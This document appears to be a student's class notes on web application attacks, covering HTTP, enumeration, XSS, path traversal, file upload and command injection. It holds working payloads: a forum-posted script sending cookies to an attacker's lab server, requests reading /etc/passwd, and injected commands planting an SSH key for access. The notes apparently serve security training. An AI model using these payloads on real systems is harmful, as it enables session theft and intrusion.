Hyper-Text Transfer Protocol (HTTP)
    Request/Response
        Various tools to view:
            tcpdump
            wireshark
            Developer Console
			GET / HTTP/1.1
			
			HTTP/1.1 200 OK



HTTP Methods
	A Select Few:
		GET
		POST
		HEAD
		PUT



HTTP Response Codes
	10X == Informational
	2XX == Success
	30X == Redirection
	4XX == Client Error
	5XX == Server Error



HTTP Fields
	User-Agent
	Referer
	Cookie
	Date
	Server
	Set-Cookie



HTTP Method Notes
	GET request can be utilized to pass data to the server using the URL string:
	https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1/something.php?var=hi
	Wget

	wget -r -l2 -P /tmp ftp://ftpserver/
	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
	wget --load-cookies cookies.txt -p https://website/interesting/article.php



JavaScript (JS)
	Allows websites to interact with the client
		JavaScript runs on the client’s machine
	Coded as .js files, or in-line of HTML



JS DEMO

		<script>
		function myFunction() {
		    document.getElementById("demo").innerHTML = "Paragraph changed.";
		}
		</script>
		
		<script src="https://www.w3schools.com/js/myScript1.js"></script>



Enumeration
	Robots.txt
		may store sites that admin's don't want us to see
	Legitimate surfing
	Tools:
		NSE scripts
		Nikto
		Burp suite (outside class)



		
Reflected XSS
	Most common form of XSS
	Transient, occurs in error messages or search results
	Delivered through intermediate media, such as a link in an email
	Characters that are normally illegal in URLs can be Base64 encoded
		Below is what you see, but the server will decode as name=abc123
			http://example.com/page.php?name=dXNlcjEyMw



Stored XSS (JavaScript is stored in the webpage)
	Resides on vulnerable site
	Only requires user to visit page
		<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">


Useful JavaScript Components

Proof of concept (simple alert):
	<script>alert('XSS');</script>
		Capturing Cookies
			document.cookie
		Capturing Keystrokes
			bind keydown and keyup
		Capturing Sensitive Data
			document.body.innerHTML







Server-Side injection	ONLY HAVE THE ABILTIY TO READ FILES
Directory Traversal/Path Traversal
	Ability to read/execute outside web server’s directory
	Uses ../../ (relative paths) in manipulating a server-side file path
		view_image.php?file=../../etc/passwd
		use page source
		look for /bin/bash
		look for /etc/hosts
		look for /etc/passwd



Malicious File Upload

Site allows unsanitized file uploads
	Server doesn’t validate extension or size
	Allows for code execution (shell)
	Once uploaded
		Find your file
		Call your file
			file to upload
			webshell.php




Command Injection	ABILITY TO USE SYSTEM LEVEL COMMANDS
	Application on the server is vulnerable, allowing execution of arbitrary commands
		User input not validated
			Common example is a SOHO router, with a web page to allow pinh
			Might contain the following in it’s code:
				system("ping -c 1 ".$_GET["ip"]);
			Run the following to chain/stack our arbitrary command
				; cat /etc/passwd
				; whoami
				; ip address

	impersonate an ip by creating an ssh key
		ssh-keygen -t rsa -n 4096
	ON THE WEB SERVER
		; mkdir /var/www/.ssh
		; echo "public key" > /var/www/.ssh/authorized_keys
			verify key
			; cat /var/www/.ssh/authorized_keys
	ssh into box
		ssh www-data@10.50.30.162

	specify a key to use
		ssh -i key www-data@10.50.30.162




CREATE A STAND UP HTTP SERVER
know your lin-ops ip address
lin-ops> python3 -m http.server

WHAT TO POST IN THE FORUM
	<script>document.location="http://10.50.34.74:8000/"+document.cookie;</script>

















